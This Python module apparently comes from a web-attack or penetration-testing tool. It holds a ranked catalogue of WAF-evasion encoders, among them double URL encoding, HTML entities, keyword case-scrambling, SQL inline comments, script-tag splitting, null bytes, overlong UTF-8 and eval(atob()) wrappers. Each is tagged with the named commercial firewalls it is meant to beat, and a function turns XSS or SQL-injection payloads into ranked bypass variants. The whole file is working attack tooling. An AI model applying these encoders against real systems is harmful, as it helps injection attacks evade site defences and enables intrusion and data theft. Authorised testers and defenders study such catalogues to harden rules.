"""
Tiered encoding catalogue for WAF evasion.

Clean-room implementation of standard, publicly documented evasion techniques
(URL/unicode/HTML/case/comment/whitespace/overlong-UTF8/char-concat ...). Each
technique is tagged with:

  - tier          1 universal .. 5 exotic (rough cost/noise ordering)
  - priority      lower tries first within a WAF's effective set
  - effective     WAF ids it tends to beat (see fingerprint.WAF_IDS); "*" = generic
  - contexts      reflection contexts where it is meaningful (context.ReflectionContext
                  values, as strings) or {"*"} for any

encode_payload() returns TARGETED variants: filtered by the reflection context so we
never emit SQL comments into an HTML attribute, and ordered by the detected WAF's
effectiveness then priority. The caller's own payload is always rank 0 (WET/DRY reuse).

A variant is a *candidate*, never a finding: a 200 through the WAF proves nothing until
the underlying payload actually fires at the origin (see the waf-bypass skill).
"""
from __future__ import annotations

import base64
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Sequence, Set

# Context group shorthands (string values mirror context.ReflectionContext.value)
_HTML = {"html_text", "html_attr_sq", "html_attr_dq", "html_attr_unquoted", "html_comment"}
_JS = {"script_body", "script_sq", "script_dq"}
_SQL = {"sql_error", "sql_string"}
_ANY = {"*"}


# ── individual encoders (pure str -> str) ─────────────────────────────────────
def _url(p: str) -> str:
    return "".join(f"%{ord(c):02X}" if c.isascii() else _url_bytes(c) for c in p)


def _url_bytes(c: str) -> str:
    return "".join(f"%{b:02X}" for b in c.encode("utf-8"))


def _double_url(p: str) -> str:
    return _url(p).replace("%", "%25")


def _url_all(p: str) -> str:
    # percent-encode every byte, including alphanumerics some WAFs normalise lazily
    return "".join(f"%{b:02X}" for b in p.encode("utf-8"))


def _unicode_js(p: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in p)


def _unicode_percent_u(p: str) -> str:
    # IIS/legacy %uXXXX form
    return "".join(f"%u{ord(c):04x}" for c in p)


def _html_dec(p: str) -> str:
    return "".join(f"&#{ord(c)};" for c in p)


def _html_hex(p: str) -> str:
    return "".join(f"&#x{ord(c):x};" for c in p)


def _html_dec_pad(p: str) -> str:
    # zero-padded decimal entities defeat naive entity regexes
    return "".join(f"&#{ord(c):07d};" for c in p)


_KEYWORDS = ("script", "select", "union", "alert", "onerror", "onload", "img",
             "svg", "iframe", "or", "and", "from", "where", "javascript")


def _mixed_case(p: str) -> str:
    out = p
    for kw in _KEYWORDS:
        out = _swapcase_kw(out, kw)
    return out


def _swapcase_kw(s: str, kw: str) -> str:
    low = s.lower()
    i = low.find(kw)
    if i < 0:
        return s
    scrambled = "".join(c.upper() if j % 2 else c.lower() for j, c in enumerate(s[i:i + len(kw)]))
    return s[:i] + scrambled + _swapcase_kw(s[i + len(kw):], kw)


def _sql_comment_ws(p: str) -> str:
    return p.replace(" ", "/**/")


def _sql_inline_comment(p: str) -> str:
    # MySQL version-gated comment: /*!SELECT*/
    out = p
    for kw in ("SELECT", "UNION", "WHERE", "FROM", "OR", "AND"):
        out = out.replace(kw, f"/*!{kw}*/").replace(kw.lower(), f"/*!{kw.lower()}*/")
    return out


def _ws_alt(p: str) -> str:
    # swap spaces for a tab; many WAFs only key on the literal space
    return p.replace(" ", "\t")


def _ws_newline(p: str) -> str:
    return p.replace(" ", "\n")


def _null_byte(p: str) -> str:
    # insert a null after the first alpha run of a flagged keyword
    for kw in ("script", "select", "alert", "union"):
        i = p.lower().find(kw)
        if i >= 0:
            cut = i + 3
            return p[:cut] + "\x00" + p[cut:]
    return "\x00" + p


def _overlong_utf8(p: str) -> str:
    # overlong 2-byte UTF-8 for the usual metacharacters
    m = {"/": "%C0%AF", ".": "%C0%AE", "'": "%C0%A7", "<": "%C0%BC", ">": "%C0%BE"}
    return "".join(m.get(c, c) for c in p)


def _hex_js(p: str) -> str:
    return "".join(f"\\x{ord(c):02x}" if ord(c) < 256 else f"\\u{ord(c):04x}" for c in p)


def _char_concat_js(p: str) -> str:
    return "String.fromCharCode(" + ",".join(str(ord(c)) for c in p) + ")"


def _base64_atob(p: str) -> str:
    # wrap a JS payload so the literal tokens never appear
    b64 = base64.b64encode(p.encode("utf-8")).decode()
    return f"eval(atob('{b64}'))"


def _base64_plain(p: str) -> str:
    return base64.b64encode(p.encode("utf-8")).decode()


def _backslash_escape(p: str) -> str:
    # gratuitous backslashes some JSON/JS parsers strip but naive WAF regexes don't
    return "".join(f"\\{c}" if c.isalpha() else c for c in p)


def _tag_split(p: str) -> str:
    # <scr<x>ipt> style splitting for filters that strip a single "<script"
    return p.replace("<script", "<scr<x>ipt").replace("</script", "</scr<x>ipt")


def _double_encode_key_chars(p: str) -> str:
    m = {"<": "%253C", ">": "%253E", "'": "%2527", '"': "%2522", "/": "%252F"}
    return "".join(m.get(c, c) for c in p)


# ── technique registry ────────────────────────────────────────────────────────
@dataclass(frozen=True)
class EncodingTechnique:
    name: str
    fn: Callable[[str], str]
    tier: int
    priority: int
    effective: Set[str]
    contexts: Set[str]

    def applies(self, waf: Optional[str], contexts: Optional[Sequence[str]]) -> bool:
        if contexts and "*" not in self.contexts and not (set(contexts) & self.contexts):
            return False
        return True

    def score(self, waf: Optional[str]) -> int:
        # lower is better; WAF-specific effectiveness pulls a technique forward
        hit = 0 if (waf and waf in self.effective) else 50
        return self.priority + hit


_TECHNIQUES: List[EncodingTechnique] = [
    # Tier 1 — universal
    EncodingTechnique("url_encode", _url, 1, 10, {"*"}, _ANY),
    EncodingTechnique("mixed_case", _mixed_case, 1, 12, {"modsecurity", "naxsi", "generic"}, _HTML | _JS | _SQL),
    EncodingTechnique("double_url_encode", _double_url, 1, 15, {"cloudflare", "akamai", "aws_waf"}, _ANY),
    EncodingTechnique("html_entity_dec", _html_dec, 1, 16, {"modsecurity", "generic"}, _HTML),
    EncodingTechnique("html_entity_hex", _html_hex, 1, 17, {"modsecurity", "generic"}, _HTML),
    # Tier 2 — product-leaning
    EncodingTechnique("url_encode_all", _url_all, 2, 22, {"cloudflare", "imperva"}, _ANY),
    EncodingTechnique("sql_comment_ws", _sql_comment_ws, 2, 23, {"modsecurity", "imperva", "aws_waf"}, _SQL),
    EncodingTechnique("whitespace_tab", _ws_alt, 2, 24, {"modsecurity", "naxsi"}, _SQL | _JS),
    EncodingTechnique("unicode_js", _unicode_js, 2, 25, {"cloudflare", "akamai"}, _JS),
    EncodingTechnique("html_entity_dec_pad", _html_dec_pad, 2, 26, {"akamai", "f5_bigip"}, _HTML),
    # Tier 3 — advanced
    EncodingTechnique("sql_inline_comment", _sql_inline_comment, 3, 31, {"modsecurity", "imperva"}, _SQL),
    EncodingTechnique("char_concat_js", _char_concat_js, 3, 32, {"cloudflare", "imperva", "akamai"}, _JS),
    EncodingTechnique("hex_js", _hex_js, 3, 33, {"cloudflare", "akamai"}, _JS),
    EncodingTechnique("tag_split", _tag_split, 3, 34, {"modsecurity", "naxsi", "generic"}, {"html_text", "html_attr_dq", "html_attr_sq"}),
    EncodingTechnique("whitespace_newline", _ws_newline, 3, 35, {"modsecurity"}, _SQL | _JS),
    # Tier 4 — exotic
    EncodingTechnique("percent_u", _unicode_percent_u, 4, 41, {"f5_bigip", "fortiweb", "barracuda"}, _ANY),
    EncodingTechnique("overlong_utf8", _overlong_utf8, 4, 42, {"f5_bigip", "fortiweb"}, _ANY),
    EncodingTechnique("double_encode_key", _double_encode_key_chars, 4, 43, {"cloudflare", "aws_waf"}, _ANY),
    EncodingTechnique("backslash_escape", _backslash_escape, 4, 44, {"generic"}, _JS | {"sql_string"}),
    # Tier 5 — evasion / obfuscation
    EncodingTechnique("base64_atob", _base64_atob, 5, 51, {"cloudflare", "imperva", "akamai", "aws_waf"}, {"script_body"}),
    EncodingTechnique("null_byte", _null_byte, 5, 52, {"modsecurity", "generic"}, _ANY),
    EncodingTechnique("base64_plain", _base64_plain, 5, 55, {"generic"}, {"*"}),
]


class EncodingCatalog:
    """Query surface over the technique registry."""

    def __init__(self, techniques: Optional[List[EncodingTechnique]] = None):
        self.techniques = techniques or list(_TECHNIQUES)

    def names(self) -> List[str]:
        return [t.name for t in self.techniques]

    def by_name(self, name: str) -> Optional[EncodingTechnique]:
        return next((t for t in self.techniques if t.name == name), None)

    def select(self, waf: Optional[str] = None,
               contexts: Optional[Sequence[str]] = None,
               max_tier: int = 5) -> List[EncodingTechnique]:
        picked = [t for t in self.techniques
                  if t.tier <= max_tier and t.applies(waf, contexts)]
        return sorted(picked, key=lambda t: (t.score(waf), t.tier))


_CATALOG = EncodingCatalog()


@dataclass
class Variant:
    rank: int
    technique: str
    payload: str
    tier: int

    def to_dict(self) -> Dict:
        return {"rank": self.rank, "technique": self.technique,
                "tier": self.tier, "payload": self.payload}


def encode_payload(payload: str,
                   waf: Optional[str] = None,
                   contexts: Optional[Sequence[str]] = None,
                   max_variants: int = 12,
                   max_tier: int = 5,
                   include_original: bool = True) -> List[Variant]:
    """Return targeted, ranked encoded variants of `payload`.

    rank 0 is the untouched payload (WET/DRY reuse-first) when include_original.
    Techniques are filtered by `contexts` and ordered by effectiveness against `waf`
    then priority. Encoders that do not change the payload in this context are dropped.
    """
    out: List[Variant] = []
    seen: Set[str] = set()
    if include_original:
        out.append(Variant(0, "original", payload, 0))
        seen.add(payload)
    rank = len(out)
    for tech in _CATALOG.select(waf=waf, contexts=contexts, max_tier=max_tier):
        try:
            enc = tech.fn(payload)
        except Exception:
            continue
        if not enc or enc == payload or enc in seen:
            continue
        seen.add(enc)
        out.append(Variant(rank, tech.name, enc, tech.tier))
        rank += 1
        if len(out) >= max_variants:
            break
    return out
